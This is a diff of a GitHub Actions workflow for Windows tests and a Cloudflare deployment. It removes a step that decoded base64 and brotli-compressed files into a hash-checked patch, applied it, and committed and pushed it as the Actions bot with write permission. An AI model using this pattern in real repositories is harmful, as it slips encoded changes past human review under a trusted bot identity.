@@ -9,42 +9,13 @@ concurrency:
   cancel-in-progress: true
 jobs:
   shutdown:
-    if: github.event.pull_request.head.repo.full_name == github.repository && github.head_ref == 'fix/shutdown-confirmed-v0.57'
-    permissions:
-      contents: write
     runs-on: windows-latest
     timeout-minutes: 15
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
-        with:
-          ref: ${{ github.head_ref }}
       - uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38
         with:
           node-version: '22'
-      - name: Apply reviewed hash-locked source patch once
-        shell: pwsh
-        run: |
-          $ErrorActionPreference='Stop'
-          if (Test-Path .shutdown-bootstrap/1.b64) {
-            git config core.autocrlf false
-            git checkout-index -f -a
-            @'
-          const fs=require('fs'),z=require('zlib'),c=require('crypto'),cp=require('child_process');
-          const encoded=[1,2,3].map(n=>fs.readFileSync('.shutdown-bootstrap/'+n+'.b64','utf8').trim()).join('');
-          const patch=z.brotliDecompressSync(Buffer.from(encoded,'base64'));
-          if(c.createHash('sha256').update(patch).digest('hex')!=='bbc506f3f3fb2ff1dc1bc44dda18a5a2148e36dec5284fccec19e570f4d3c3d2')throw Error('Reviewed patch hash mismatch');
-          for(const flags of [['--check'],[]]){const r=cp.spawnSync('git',['apply','--unidiff-zero','--ignore-space-change',...flags,'-'],{input:patch,stdio:['pipe','inherit','inherit']});if(r.status!==0)throw Error('Patch application failed');}
-          fs.rmSync('.shutdown-bootstrap',{recursive:true});
-          '@ | node
-            if ($LASTEXITCODE -ne 0) { throw 'Source patch failed' }
-            git config user.name 'github-actions[bot]'
-            git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
-            git add -A
-            git commit -m 'Fix confirmed Windows shutdown, receipt API and coordinated deployment v0.57'
-            if ($LASTEXITCODE -ne 0) { throw 'Source commit failed' }
-            git push origin HEAD:fix/shutdown-confirmed-v0.57
-            if ($LASTEXITCODE -ne 0) { throw 'Source push failed; branch may have changed' }
-          }
       - run: npm ci
       - name: Full regression suite and build
         shell: pwsh
@@ -74,6 +45,7 @@ jobs:
           include-hidden-files: true
           retention-days: 7
   cloudflare:
+    if: github.event.pull_request.head.repo.full_name == github.repository && github.head_ref == 'fix/shutdown-confirmed-v0.57'
     needs: shutdown
     runs-on: ubuntu-latest
     timeout-minutes: 15
@@ -81,8 +53,6 @@ jobs:
       CLOUDFLARE_ACCOUNT_ID: '4640527a19614f7b65a034f422704b64'
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
-        with:
-          ref: ${{ github.head_ref }}
       - uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38
         with:
           node-version: '22'
